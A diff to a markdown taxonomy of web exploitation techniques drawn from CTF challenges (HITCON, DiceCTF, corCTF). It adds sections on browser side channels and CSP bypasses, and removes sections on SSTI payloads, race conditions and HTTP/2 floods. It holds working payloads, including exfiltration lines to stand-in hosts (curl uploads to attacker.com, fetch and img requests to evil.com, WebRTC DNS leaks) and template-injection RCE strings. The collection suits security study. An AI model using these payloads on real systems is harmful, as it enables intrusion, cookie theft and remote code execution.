+### 4.4 TCP Port Reflection for Eval Injection
+
+**What is manipulated**: When a server-side application scans TCP ports and evaluates responses, the attacker finds or creates a service that echoes back attacker-controlled data in the expected format.
+
+**HITCON CTF 2025 "No Man's Echo"**: PHP script scans 43 ports starting from user-controlled offset, sends `php://input` to each, and `eval()`s any response matching `{"signal":"Arrival","logogram":"..."}`.
+
+```
+Attack:
+  1. Find a TCP service on the host that echoes input (SMTP banner, FTP, Redis, etc.)
+  2. Craft input so the echo produces valid JSON with PHP code in "logogram"
+  3. Set the port scan offset to hit the reflecting service
+  4. Server eval()s the reflected PHP code → RCE
+```
+
+### 4.5 Apache `mod_negotiation` Content-Type Bypass
+
+**What is manipulated**: Apache's MultiViews content negotiation serves files with inferred Content-Types that differ from the upload directory's restrictions.
+
+**HITCON CTF 2020 "oStyle"**: Upload directory has `php_flag engine off` (no PHP execution). But `mod_negotiation` with `MultiViews` enabled allows Apache to serve an uploaded `.html` file with `text/html` Content-Type based on content negotiation, bypassing the "no execution" restriction and enabling stored XSS.
+
+### 4.6 ASP.NET Request Validation as Security Check Bypass
+
+**What is manipulated**: ASP.NET's Request Validation throws exceptions on inputs containing `<`, `>`, etc. If error handling swallows this exception, security checks in the same try block are skipped.
+
+**HITCON CTF 2019 "Buggy .Net"**:
+```csharp
+bool isBad = false;
+try {
+    if (Request.Form["filename"].Contains(".."))  // security check
+        isBad = true;
+} catch { }  // Request Validation exception swallowed here
+
+if (!isBad) {
+    // isBad is still false because the Contains() check never ran
+    File.ReadAllText("C:\\inetpub\\wwwroot\\" + filename);  // path traversal
+}
+```
+
+**Payload**: `filename=..\..\etc\passwd<` — the `<` triggers Request Validation exception before the `..` check executes, so `isBad` stays `false`.
+
+### 4.7 cURL Config File Chaining for Raw TCP
+
+**What is manipulated**: When `gopher://` is unavailable, cURL's `--config` (`-K`) option chains multiple cURL invocations through config files to achieve raw TCP communication.
+
+**DiceCTF 2023 "unfinished"**: SSRF to MongoDB (Wire Protocol over TCP) without gopher support.
+```
+Stage 1: Write a cURL config file to disk using -o
+  curl http://attacker.com/config.txt -o /tmp/curl.conf
+
+Stage 2: Execute cURL with the config file to send raw MongoDB Wire Protocol
+  curl -K /tmp/curl.conf
+  # Config contains: url = "telnet://127.0.0.1:27017"
+  # Plus binary data for MongoDB query
+
+Stage 3: Upload the response (containing flag) to attacker server
+  curl -T /tmp/mongo_response http://attacker.com/exfil
+```
+
+---
+
+## 5. Browser-Native Side Channels & Mechanism Abuse
+
+> Novel browser-side exploitation primitives that abuse legitimate web platform features in unintended ways. These are distinct from standard XS-Leaks (covered in `xs-leak.md`) because they exploit *specific browser implementation details or newer APIs* rather than general cross-origin information leakage patterns.
+
+### 5.1 Browser Crash / Hang as 1-Bit Oracle
+
+**What is manipulated**: A browser rendering bug causes a tab crash or extreme slowdown *conditional* on page content. The crash/hang itself becomes a detectable signal.
+
+**DiceCTF 2024 "another-csp"**: CSS `color-mix()` with `srgb(from var(...))` triggered a Chromium rendering bug that crashed the tab. By making the CSS selector conditional on a data attribute:
+
+```css
+/* If the token starts with "a", apply the crashing CSS: */
+h1[data-token^="a"] {
+    color: color-mix(in srgb, blue 50%, srgb(from var(--c1) r g b));
+}
+```
+
+- Crash (detected via 10s timeout) = character match
+- No crash = no match
+- Binary search extracts the full token character by character
+
+**Variant — CSS variable recursion**: Instead of a crash, use billion-laughs-style CSS variable expansion to cause measurable slowdown:
+```css
+/* Exponential expansion causes detectable delay: */
+:root { --a: var(--b)var(--b); --b: var(--c)var(--c); /* ... */ }
+h1[data-token^="a"] { content: var(--a); }
+```
+
+### 5.2 Closed Shadow DOM Breach via Deprecated APIs
+
+**What is manipulated**: Closed Shadow DOM is supposed to be an impenetrable encapsulation boundary. Deprecated WebKit CSS properties combined with deprecated DOM APIs pierce through it.
+
+**DiceCTF 2022 "shadow"**: The flag is inside a closed Shadow DOM with all `document`/`window` references nulled.
+
+```css
+/* Step 1: Apply deprecated CSS to make shadow host editable */
+#shadow-host {
+    -webkit-user-modify: read-write;
+}
+```
 
 ```javascript
-// Chain: PP → env pollution → child_process RCE
-Object.prototype.env = {};
-Object.prototype.env.NODE_OPTIONS = '--require=/proc/self/environ';
-Object.prototype.env.NODE_DEBUG = 'child_process';
-Object.prototype.shell = true;
+// Step 2: Use window.find() to focus text within the shadow boundary
+window.find('flag');
 
-// Any subsequent: child_process.spawn('node', [...], {})
-// Options object inherits polluted prototype → env/shell applied → RCE
+// Step 3: Use deprecated execCommand to inject into the shadow context
+document.execCommand('insertHTML', false, '<svg onload="fetch(`https://evil.com/?`+this.getRootNode().textContent)">');
+// The SVG executes inside the shadow DOM context → can read enclosed content
 ```
 
-**`LD_PRELOAD` via PP**: If the PP can set `process.env.LD_PRELOAD` and the application spawns native processes (imagemagick, ffmpeg, etc.), the preloaded library executes.
+**Key insight**: `-webkit-user-modify` enables `contenteditable`-like behavior on the shadow host. `window.find()` + `document.execCommand` then operate *inside* the shadow boundary because the editable region spans it.
 
-### 9.4 `HTTP_PROXY` via CGI/WSGI Header Mapping (httpoxy)
+### 5.3 XSLT/XXE in Browser with JavaScript Disabled
 
-**What is manipulated**: In CGI environments, HTTP headers are mapped to `HTTP_*` environment variables. The `Proxy:` header becomes `HTTP_PROXY`.
+**What is manipulated**: Puppeteer's `page.setJavaScriptEnabled(false)` only disables JavaScript — the browser's XML/XSLT processing engine remains fully active and is not restricted by CSP.
 
-```
-GET / HTTP/1.1
-Host: target.com
-Proxy: http://attacker.com:8080
-
-→ CGI sets HTTP_PROXY=http://attacker.com:8080
-→ Backend HTTP libraries (urllib, requests, curl) use this proxy for outbound requests
-→ Attacker intercepts all server-to-server traffic
-```
-
-**CVE-2016-5385** (PHP), **CVE-2016-5386** (Go), **CVE-2016-5387** (Apache), **CVE-2016-5388** (Tomcat).
-
----
-
-## 10. Advanced Race Condition Primitives
-
-> Beyond basic TOCTOU — advanced synchronization techniques from PortSwigger research and top-tier CTFs.
-
-### 10.1 Single-Packet Attack (HTTP/2 Multiplexing)
-
-**What is manipulated**: HTTP/2 multiplexes multiple requests within a single TCP packet, ensuring they arrive at the server simultaneously — eliminating network jitter as a variable.
-
-```python
-# Using h2 library to send N requests in a single TCP frame:
-import h2.connection
-
-conn = h2.connection.H2Connection()
-# Queue all requests without flushing:
-for i in range(20):
-    conn.send_headers(stream_id=2*i+1, headers=[...])
-    conn.send_data(stream_id=2*i+1, data=b'...')
-# Flush all at once → single packet containing all 20 requests
+**DiceCTF 2023 "impossible-xss"**:
+```xml
+<?xml version="1.0"?>
+<?xml-stylesheet type="text/xsl" href="data:text/xml,
+  <xsl:stylesheet xmlns:xsl='http://www.w3.org/1999/XSL/Transform' version='1.0'>
+    <xsl:template match='/'>
+      <html>
+        <body>
+          <img src='https://evil.com/?cookie={document.cookie}'/>
+        </body>
+      </html>
+    </xsl:template>
+  </xsl:stylesheet>
+"?>
+<root/>
 ```
 
-**Impact**: Eliminates the ~1ms variance that typically makes web race conditions unreliable. Achieves sub-microsecond synchronization.
+**Why it works**: XSLT is processed by a separate engine in the browser, not the JavaScript engine. CSP `script-src` doesn't block XSLT processing. `setJavaScriptEnabled(false)` doesn't affect XML parsing. The XSLT output (HTML) can include `<img>` tags for data exfiltration.
 
-### 10.2 Last-Byte Synchronization
+### 5.4 Chrome Text Fragment Pixel Side-Channel
 
-**What is manipulated**: For HTTP/1.1 (where multiplexing isn't available), send all request data *except the last byte*, then send all final bytes simultaneously.
+**What is manipulated**: Chrome's Scroll-to-Text Fragment (`#:~:text=`) highlights matching text with a yellow background. This visual change is detectable even after extreme image downsampling.
 
-```python
-# Phase 1: Send N-1 bytes for each request (slowly, over separate connections)
-sockets = []
-for i in range(20):
-    s = socket.create_connection((target, 443))
-    s = ssl.wrap_socket(s)
-    s.send(request_data[:-1])  # all but last byte
-    sockets.append(s)
-
-# Phase 2: Send all last bytes simultaneously
-for s in sockets:
-    s.send(request_data[-1:])
-```
-
-### 10.3 Connection Warming
-
-**What is manipulated**: The first request on a new connection is slower (TLS handshake, server-side connection setup). Pre-warming connections ensures all race participants are on equal footing.
-
-```python
-# Send a throwaway request on each connection first:
-for s in sockets:
-    s.send(b'GET / HTTP/1.1\r\nHost: target\r\n\r\n')
-    s.recv(4096)  # drain response
-# Now all connections are "warm" → send real requests
-```
-
-### 10.4 Multi-Endpoint Race Conditions
-
-**What is manipulated**: Instead of racing the same endpoint, race different endpoints that share state. Example: race a password reset against a login, or race a purchase against a balance check.
+**HITCON CTF 2021 "Vulpixelize"**: A screenshot service captures URLs at 1920x1080, downscales to 64x64, then upscales back (extreme pixelation).
 
 ```
-Endpoint A: POST /api/transfer (deducts balance)
-Endpoint B: POST /api/withdraw (also deducts balance)
-
-Both check balance > amount, but neither locks the balance row.
-Racing A and B simultaneously → double-spend
+Attack:
+  1. The /flag endpoint returns the flag only to 127.0.0.1
+  2. The screenshot service accesses URLs from localhost
+  3. Request: http://127.0.0.1:8000/flag#:~:text=hitcon{a
+     → If "hitcon{a" exists in the page, Chrome highlights it (yellow background)
+     → Even at 64x64, the color difference is measurable
+  4. Binary search over characters: highlighted = match, no highlight = no match
 ```
 
-### 10.5 Partial Object Construction Race
+### 5.5 Cookie Parser Differential (Jetty / Tomcat Quote Smuggling)
 
-**What is manipulated**: An object is created in multiple steps (e.g., user creation: insert row → set password → set role). Accessing the object between steps reveals uninitialized fields.
+> **→ Comprehensive coverage**: `02-auth/cookie.md` §1-2 (Cookie Sandwich), §2-1 (Legacy RFC Parsing), §2-2 (Quoted-Value Parsing Differentials). This section retains only the CTF-specific exploitation chain.
 
-```
-Thread 1: INSERT INTO users (email) VALUES ('attacker@evil.com')  -- role defaults to NULL
-Thread 2: SELECT * FROM users WHERE email='attacker@evil.com'  -- reads before role is set
-Thread 1: UPDATE users SET role='user' WHERE email='attacker@evil.com'
+**DiceCTF 2023 "jnotes"**: Combined cookie path ordering + Jetty RFC 2109 quoted-string absorption to leak HttpOnly flags. The novel element was using Chrome's path-length-first cookie ordering to position an attacker-set cookie (`=note="`) before the HttpOnly cookie, causing Jetty's parser to absorb the flag into the quoted value.
 
-If NULL role is treated differently (e.g., as admin), race achieves privilege escalation.
-```
+### 5.6 WebRTC STUN DNS Exfiltration (CSP Bypass)
 
----
+**What is manipulated**: CSP does not restrict WebRTC ICE candidate gathering. Creating an `RTCPeerConnection` with a STUN server URL containing encoded data triggers a DNS lookup that exfiltrates data.
 
-## 11. Protocol-Level Exploitation Primitives
-
-> HTTP/2 and TLS-level attacks beyond request smuggling.
-
-### 11.1 HTTP/2 CONTINUATION Frame Flood (CVE-2024-27316)
-
-**What is manipulated**: HTTP/2 allows HEADERS to be split across multiple CONTINUATION frames. Many implementations buffer all CONTINUATION frames in memory before processing headers.
-
-```
-Send HEADERS frame (without END_HEADERS flag)
-→ Follow with millions of CONTINUATION frames
-→ Server buffers them all → OOM denial of service
-```
-
-**Affected**: Apache httpd, Node.js, Go `net/http`, nghttp2. The attack requires only a single TCP connection.
-
-### 11.2 HTTP/2 Rapid Reset (CVE-2023-44487)
-
-**What is manipulated**: Send HTTP/2 request immediately followed by RST_STREAM. The server begins processing the request but the reset cancels response generation. Repeat rapidly to overwhelm server without exceeding concurrent stream limits.
-
-```
-HEADERS (stream 1) → RST_STREAM (stream 1) → HEADERS (stream 3) → RST_STREAM (stream 3) → ...
-```
-
-**Impact**: Record-breaking DDoS (398 million rps observed by Google). The attack is asymmetric — the client's cost per request is minimal.
-
-### 11.3 TLS-Level Exploitation Primitives
-
-| Attack | What is Manipulated | Impact |
-|--------|-------------------|--------|
-| **CRIME/BREACH** | TLS/HTTP compression reveals plaintext via response size | CSRF token extraction |
-| **Lucky13** | CBC MAC timing depends on padding length | Plaintext recovery |
-| **ROBOT** | Bleichenbacher oracle in TLS RSA key exchange | Session decryption |
-| **Raccoon** | DH key exchange timing side-channel | Pre-master secret recovery |
-| **0-RTT Replay** | TLS 1.3 early data is not replay-protected | Duplicate state-changing requests |
-
-### 11.4 WebSocket Hijacking via CSWSH
-
-**What is manipulated**: WebSocket handshakes are regular HTTP requests that respect cookies but don't have CSRF protection by default.
+**corCTF 2023 "crabspace"**: Strict CSP (`default-src 'none'; script-src 'unsafe-inline'`) blocks all network requests. But WebRTC is exempt:
 
 ```javascript
-// From attacker.com:
-const ws = new WebSocket('wss://target.com/ws');
-// Browser attaches target.com cookies automatically
-// If server doesn't validate Origin header → attacker has authenticated WebSocket
-ws.onmessage = (e) => { fetch('https://attacker.com/log?d=' + e.data); };
+// CSP blocks: fetch(), XHR, img src, script src, etc.
+// CSP does NOT block: WebRTC STUN/TURN ICE candidate gathering
+
+const pc = new RTCPeerConnection({
+    iceServers: [{ urls: 'stun:' + encodedData + '.attacker.com:1337' }]
+});
+pc.createDataChannel('');
+pc.createOffer().then(o => pc.setLocalDescription(o));
+// → DNS query for "{encodedData}.attacker.com" → attacker's DNS server captures it
+```
+
+**Key insight**: This bypasses even the strictest CSP configurations. The W3C is aware (CSP Issue #92) but WebRTC ICE candidate gathering remains unrestricted.
+
+### 5.7 bfcache Weaponization (Response Replay)
+
+**What is manipulated**: The browser's back-forward cache (bfcache) stores complete page snapshots. Navigating back replays the cached response — including any poisoned headers or content from the initial load.
+
+**corCTF 2024 "iframe-note"**: Prototype pollution injects a `SCRIPT_NAME` header into fetch requests. Gunicorn uses this to determine the base URL, causing `<script src>` attributes to resolve to the attacker's domain. But this only works for the *initial* page load. The exploit forces a forward navigation, then triggers back-navigation — bfcache replays the poisoned response, loading attacker's scripts.
+
+### 5.8 CSP `report-uri` as Exfiltration Channel
+
+**What is manipulated**: When a CSP violation occurs, the browser sends a JSON report to `report-uri` containing the blocked content. By intentionally triggering violations, the attacker uses the reporting mechanism itself as a data exfiltration channel.
+
+**DiceCTF 2023 "codebox"**: Inject `require-trusted-types-for 'script'` into CSP. Any `innerHTML` assignment now triggers a Trusted Types violation. The violation report sent to `report-uri` includes the blocked script content — which contains the flag.
+
+### 5.9 Unicode Case-Folding Length Confusion in WASM
+
+**What is manipulated**: Unicode case conversion can change string length (German `ß` → `SS`, ligature `ﬃ` → `FFI`). When WASM calculates buffer size *before* conversion, the expanded result overflows the safety check boundary.
+
+**DiceCTF 2022 "blazingfast"**: WASM-based "MoCkInG CaSe" converter checks first N characters for safety.
+
+```
+Input: "ß" × 500 + "<img src=x onerror=alert(1)>"
+
+WASM length check: examines first 500 bytes → all safe 'ß' characters ✓
+After uppercase conversion: "SS" × 500 + "<img src=x onerror=alert(1)>"
+  → The converted string is 1000+ bytes, but the XSS payload at position 500+
+    was never examined because the length check only covered the pre-conversion size
+```
+
+### 5.10 Nginx Error Response CSP Header Omission
+
+**What is manipulated**: Nginx middleware that adds CSP headers via `add_header` only applies to 2xx and 3xx responses by default. Error responses (4xx, 5xx) lack CSP headers.
+
+**corCTF 2023 "leakynote"**: Search returning no results triggers 404. The 404 response has no `frame-ancestors` CSP → the page can be iframed. By testing if the iframe loads (no CSP) or is blocked (CSP present), the attacker determines whether a search query has results — a binary oracle for character-by-character flag extraction.
+
+```nginx
+# Nginx config (common pattern):
+add_header Content-Security-Policy "frame-ancestors 'none'" always;
+#                                                           ^^^^^^
+# Without "always", the header is only added to 2xx/3xx responses
 ```
 
 ---
 
-## 12. Template Engine RCE Gadgets
+## 6. Competition → Technique Cross-Reference
 
-> Specific template engine escape / sandbox bypass techniques that go beyond generic SSTI payloads.
-
-### 12.1 Jinja2 — `lipsum.__globals__` / `cycler.__init__.__globals__`
-
-```python
-# Access os module through Jinja2 global functions:
-{{ lipsum.__globals__['os'].popen('id').read() }}
-{{ cycler.__init__.__globals__.os.popen('id').read() }}
-{{ namespace.__init__.__globals__.os.popen('id').read() }}
-
-# When 'os' is filtered:
-{{ lipsum.__globals__['__builtins__']['__import__']('o'+'s').popen('id').read() }}
-```
-
-### 12.2 Jinja2 — `config` Object / `request` Object Traversal
-
-```python
-# Flask-specific Jinja2 globals:
-{{ config.items() }}  # dump all configuration
-{{ request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
-```
-
-### 12.3 Twig (PHP) — `_self.env` → Arbitrary Include
-
-```php
-// Twig < 1.20:
-{{ _self.env.registerUndefinedFilterCallback("exec") }}
-{{ _self.env.getFilter("id") }}
-
-// Twig 1.x with file include:
-{{ _self.env.setCache("/tmp") }}
-{{ _self.env.loadTemplate("evil.php") }}
-```
-
-### 12.4 Velocity (Java) — Reflection Chain
-
-```velocity
-#set($rt = $x.class.forName('java.lang.Runtime'))
-#set($chr = $rt.getRuntime())
-$chr.exec('id')
-```
-
-### 12.5 Freemarker (Java) — `new()` Built-in
-
-```freemarker
-<#assign ex="freemarker.template.utility.Execute"?new()>
-${ex("id")}
-
-<!-- ObjectConstructor for arbitrary class instantiation: -->
-<#assign classloader=object?api.class.protectionDomain.classLoader>
-<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
-```
-
-### 12.6 Smarty (PHP) — `{php}` Tag and Static Method Calls
-
-```smarty
-{php}system('id');{/php}
-
-// Smarty 3+ (when {php} is disabled):
-{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['c']); ?>",self::clearConfig())}
-
-// Via math:
-{math equation="(\"\\163\\171\\163\\164\\145\\155\")(\"id\")" }
-```
+| Competition | Year | Challenge | Technique | Section |
+|------------|------|-----------|-----------|---------|
+| **Google CTF** | 2025 | Postviewer v5 | PRNG state recovery from base36-encoded partial output via Z3 | §2.5 |
+| **Google CTF** | 2024 | Grand Prix Heaven | Regex `[A-z]` range includes `[\]^_\`` — path validation bypass | §3.3 |
+| **HITCON CTF** | 2024 | HTML Upload | Chunked encoding differential: validator processes entire file, browser processes chunk-by-chunk with different encoding per chunk | §3.4 |
+| **HITCON CTF** | 2025 | Pholyglot | SQLite `VACUUM INTO` file write from 30-char SQL injection window | §4.3 |
+| **HITCON CTF** | 2025 | No Man's Echo | TCP port reflection for eval injection — echo service as code delivery | §4.4 |
+| **HITCON CTF** | 2021 | One-Bit Man | Single bit-flip source code corruption → PHP auth bypass | §4.2 |
+| **HITCON CTF** | 2021 | Vulpixelize | Chrome Text Fragment pixel side-channel through extreme downsampling | §5.4 |
+| **HITCON CTF** | 2020 | oStyle | Apache `mod_negotiation` MultiViews Content-Type bypass | §4.5 |
+| **HITCON CTF** | 2019 | Buggy .Net | ASP.NET Request Validation exception swallows security checks | §4.6 |
+| **HITCON CTF** | 2017 | Babyfirst Revenge | Filesystem-as-command-assembler — 5-byte/4-byte RCE | §4.1 |
+| **PlaidCTF** | 2025 | Tales from the Crypt | Corrupted RSA key recovery via Coppersmith's method → TLS session decryption from pcap | §2.3.2 |
+| **DiceCTF** | 2024 | another-csp | Browser crash (`color-mix` bug) as 1-bit oracle for token extraction | §5.1 |
+| **DiceCTF** | 2023 | jwtjail | Proxy `apply` trap `argumentsList` realm leak → vm sandbox escape | §1.2.4 |
+| **DiceCTF** | 2023 | impossible-xss | XSLT/XXE in browser with JS disabled — bypasses CSP and `setJavaScriptEnabled(false)` | §5.3 |
+| **DiceCTF** | 2023 | jnotes | Jetty cookie parser quote smuggling — absorbs HttpOnly cookie into reflected value | §5.5 |
+| **DiceCTF** | 2023 | codebox | CSP `report-uri` as exfiltration channel via Trusted Types violation | §5.8 |
+| **DiceCTF** | 2023 | unfinished | cURL config file chaining for raw TCP (SSRF to MongoDB without gopher) | §4.7 |
+| **DiceCTF** | 2022 | shadow | Closed Shadow DOM breach via `-webkit-user-modify` + `window.find()` | §5.2 |
+| **DiceCTF** | 2022 | blazingfast | Unicode case-folding length confusion in WASM (`ß` → `SS` expansion) | §5.9 |
+| **corCTF** | 2024 | iframe-note | bfcache weaponization — back-navigation replays poisoned response | §5.7 |
+| **corCTF** | 2023 | crabspace | WebRTC STUN DNS exfiltration bypasses strictest CSP | §5.6 |
+| **corCTF** | 2023 | leakynote | Nginx error response omits CSP headers → `frame-ancestors` bypass oracle | §5.10 |
+| **SECCON CTF** | 2024 | Pyjail | `help()` as import primitive — help system internally imports modules | §1.1.2 |
+| **jailCTF** | 2025 | multiple | `gc.get_objects()` memory archaeology, code object surgery, `__init_subclass__` hooks | §1.1 |
+| **KalmarCTF** | 2025 | Pyjail | `numpy.genfromtxt()` for arbitrary file read in restricted environment | §1.1.1 |
 
 ---
 
-## Competition → Technique Cross-Reference
+## 7. Cross-Reference to Dedicated Documents
 
-| Competition | Year | Challenge | Technique |
-|------------|------|-----------|-----------|
-| **Google CTF** | 2025 | Postviewer v5 | PRNG state recovery from base36-encoded partial output, `onmessage` leak via non-cached file race |
-| **Google CTF** | 2024 | Sappy | postMessage + `data:` scheme for host validation bypass |
-| **Google CTF** | 2024 | In the Shadows | Shadow DOM `:host-context()` CSS exfiltration of Light DOM attributes |
-| **Google CTF** | 2024 | Grand Prix Heaven | Regex `[A-z]` range includes `[\]^_\`` — path validation bypass |
-| **HITCON CTF** | 2024 | Private Browsing+ | bfcache restoration with prototype-pollution-injected fetch headers |
-| **HITCON CTF** | 2024 | HTML Upload | Chunked encoding differential: validator processes entire file, browser processes chunk-by-chunk with different encoding per chunk |
-| **DiceCTF** | 2024 | web (multiple) | DOM clobbering of `document.defaultView` to break React Router |
-| **PlaidCTF** | 2025 | Tales from the Crypt | Corrupted RSA key recovery via Coppersmith's method → TLS session decryption from pcap |
-| **corCTF** | 2024 | web challenges | CSS `:has()` selector + `@import` chaining for recursive token extraction |
-| **SekaiCTF** | 2024 | htmlsandbox | Character encoding escape sequences + CSP bypass via `data:` URI |
-| **SECCON CTF** | 2024 | Pyjail | `help()` as import primitive — help system internally imports modules |
-| **jailCTF** | 2025 | multiple | `gc.get_objects()` memory archaeology, code object surgery, `__init_subclass__` hooks |
-| **KalmarCTF** | 2025 | Pyjail | `numpy.genfromtxt()` for arbitrary file read in restricted environment |
-| **Intigriti** | 2024/07 | Memo | DOM clobbering + `<base>` tag injection + CSP `strict-dynamic` bypass |
+The following topics are frequently seen in CTFs but are comprehensively covered in their own taxonomy documents within the-map. **Do not add them to this document.**
+
+| CTF Topic | Dedicated Document | Key Sections |
+|-----------|-------------------|-------------|
+| XS-Leaks (frame counting, timing, cache probing) | `05-client-side/xs-leak.md` | §1 Timing, §2 State-Based, §3 Event-Based |
+| Prototype Pollution → RCE gadgets (EJS, Pug, child_process) | `01-injection/prototype-pollution.md` | §5 Server-Side Gadgets |
+| PHP internals (iconv, session upload, extract, PHP-FPM) | `09-frameworks-and-languages/php.md` | §3–§8 |
+| DOM Clobbering (router hijack, sanitizer bypass) | `05-client-side/dom-clobbering.md` | §1–§5 |
+| CSS injection / exfiltration (`:has()`, `@import` chain) | `05-client-side/client-side-web-security.md` | §1 XS-Leaks via CSS |
+| Client-Side Desync (browser-powered smuggling) | `03-http-protocol/http-parsing-discrepancy/http-request-smuggling.md` | CSD section |
+| ESI / XSLT injection | `01-injection/ssi-esi-xslt-injection.md` | §2 ESI, §3 XSLT |
+| HTML-to-PDF SSRF (wkhtmltopdf, Puppeteer, mPDF) | `04-server-side/document-media-processing-library-rce.md` | §9 HTML-to-PDF |
+| LaTeX injection | `01-injection/latex-injection.md` | §1–§4 |
+| Redis SSRF (Gopher, RESP injection) | `04-server-side/ssrf.md` | Protocol scheme abuse |
+| Argument / flag injection (git, tar, curl, ssh) | `01-injection/command-injection.md` | §2 Argument Injection |
+| Race conditions (single-packet, last-byte, multi-endpoint) | `07-application-logic/web-race-condition.md` | §1–§8 |
+| SSTI payloads (Jinja2, Twig, FreeMarker, Velocity, Smarty) | `01-injection/ssti.md` | §1–§6 |
+| HTTP/2 CONTINUATION flood / Rapid Reset | `03-http-protocol/http-parsing-discrepancy/http-request-smuggling.md` | HTTP/2 section |
+| WebSocket hijacking (CSWSH) | `03-http-protocol/websocket.md` | Cross-site section |
+| JSON number precision loss (IEEE 754 `2^53`) | `06-encoding-parser/type-confusion-and-coercion.md` | §9-4 |
+| Cookie parser differentials (Jetty, Tomcat, RFC 2109 quoted-string) | `02-auth/cookie.md` | §1-2 Cookie Sandwich, §2-1 Legacy RFC, §2-2 Quoted-Value |
+| TLS attacks (CRIME, BREACH, ROBOT) | `07-application-logic/web-timing-attack.md` | TLS timing section |
 
 ---
 
 ## References
 
-- James Kettle — [Browser-Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks) (Black Hat USA 2022)
-- James Kettle — [Smashing the State Machine: The True Potential of Web Race Conditions](https://portswigger.net/research/smashing-the-state-machine) (Black Hat USA 2023)
-- Charles Fol — [Iconv, Set the Charset to RCE](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1) (OffensiveCon 2024, CVE-2024-2961)
-- Synacktiv — [PHP Filters Chain: What is it and how to use it](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it) (2022)
-- Synacktiv — [PHP Filter Chains: File Read from Error-Based Oracle](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle) (2023)
-- Huli — [Beyond XSS](https://aszx87410.github.io/beyond-xss/) — DOM Clobbering, CSS Injection comprehensive guide
-- Huli — [GoogleCTF 2024 Writeups](https://blog.huli.tw/2024/06/28/en/google-ctf-2024-writeup/)
-- Huli — [HITCON CTF & corCTF & SekaiCTF 2024](https://blog.huli.tw/2024/09/23/en/hitconctf-corctf-sekaictf-2024-writeup/)
-- Huli — [idekCTF 2024 — Advanced iframe Magic](https://blog.huli.tw/2024/09/07/en/idek-ctf-2024-iframe/)
-- terjanq — [Postviewer v5 (Google CTF 2025)](https://gist.github.com/terjanq/e66c2843b5b73aa48405b72f4751d5f8)
-- jsur.in — [PlaidCTF 2025 Tales from the Crypt](https://jsur.in/posts/2025-04-07-plaid-ctf-2025-tales-from-the-crypt/)
-- xsleaks.dev — [XS-Leaks Wiki](https://xsleaks.dev/)
-- Bishop Fox — [Untwisting the Mersenne Twister](https://bishopfox.com/blog/untwisting-mersenne-twister-killed-prng)
-- elttam — [Hacking with Environment Variables](https://www.elttam.com/blog/env/)
-- jailCTF — [Pyjail Collection](https://github.com/jailctf/pyjail-collection)
-- Chovid99 — [Google CTF 2025](https://chovid99.github.io/posts/google-ctf-2025/)
-- Nowak & Pelissier — [HTTP/2 CONTINUATION Flood](https://kb.cert.org/vuls/id/421644) (CVE-2024-27316)
+### CTF Challenge Archives & Writeups
+- Orange Tsai — [My-CTF-Web-Challenges](https://github.com/orangetw/My-CTF-Web-Challenges) — 38+ HITCON CTF web challenges with source code and intended solutions
+- jailCTF — [Pyjail Collection](https://github.com/jailctf/pyjail-collection) — Comprehensive pyjail challenge archive
+- Huli — [DiceCTF 2022 Writeups](https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/) — Shadow DOM breach, blazingfast WASM bypass
+- Huli — [DiceCTF 2023 Writeups](https://blog.huli.tw/2023/02/08/en/dicectf-2023-writeup/) — jwtjail Proxy escape, impossible-xss XSLT, jnotes cookie smuggling
+- Huli — [DiceCTF 2024 Writeups](https://blog.huli.tw/2024/02/07/en/dicectf-2024-writeup/) — another-csp browser crash oracle
+- Huli — [corCTF 2023 Writeups](https://blog.huli.tw/2023/08/07/en/corctf-2023-writeup/) — crabspace WebRTC exfil, leakynote Nginx CSP omission
+- Huli — [GoogleCTF 2024 Writeups](https://blog.huli.tw/2024/06/28/en/google-ctf-2024-writeup/) — Grand Prix Heaven regex bypass
+- Huli — [HITCON CTF & corCTF & SekaiCTF 2024](https://blog.huli.tw/2024/09/23/en/hitconctf-corctf-sekaictf-2024-writeup/) — Encoding differentials
+
+### Specific Technique References
+- terjanq — [Postviewer v5 (Google CTF 2025)](https://gist.github.com/terjanq/e66c2843b5b73aa48405b72f4751d5f8) — PRNG state recovery writeup
+- jsur.in — [PlaidCTF 2025 Tales from the Crypt](https://jsur.in/posts/2025-04-07-plaid-ctf-2025-tales-from-the-crypt/) — RSA partial key exposure
+- Chovid99 — [Google CTF 2025](https://chovid99.github.io/posts/google-ctf-2025/) — Multiple challenge writeups
+- Ankur Sundara — [corCTF 2024 iframe-note](https://ankursundara.com/blog/) — bfcache weaponization with prototype pollution
+- str.lc — [DiceCTF 2023 codebox](https://str.lc/) — CSP report-uri exfiltration via Trusted Types
+- Bishop Fox — [Untwisting the Mersenne Twister](https://bishopfox.com/blog/untwisting-mersenne-twister-killed-prng) — PRNG state recovery
+- XPN — [VM2 Sandbox Escape](https://www.xpnsec.com/) — Node.js vm2 escape techniques
+- LiveOverflow — [Python Jail Escape Techniques](https://www.youtube.com/c/LiveOverflow) — Video walkthroughs
 
 ---
 
-*This document covers exploitation primitives that fall outside the standard vulnerability classes in the-map project. Each technique has been validated in top-tier CTF competitions and has demonstrated or has clear potential for real-world applicability.*
+*This document covers exploitation primitives that fall outside the standard vulnerability classes in the-map project. Each technique has been validated in top-tier CTF competitions. For topics with dedicated taxonomy documents, see the cross-reference table above.*
